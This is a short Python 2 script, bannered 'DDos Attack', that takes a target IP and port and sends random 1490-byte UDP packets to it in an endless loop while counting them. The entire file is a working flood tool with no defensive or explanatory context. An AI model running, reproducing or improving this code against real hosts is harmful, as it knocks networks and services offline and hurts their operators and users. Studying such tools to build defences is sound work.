import sys
import os
import time
import socket
import random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("figlet DDos Attack")
ip = raw_input("IP Target : ")
port = input("Port       : ")
sent = 0
while True:
	sock.sendto(bytes, (ip,port))
	sent = sent + 1
	print "Sent %s packet to %s throught port:%s"%(sent,ip,port)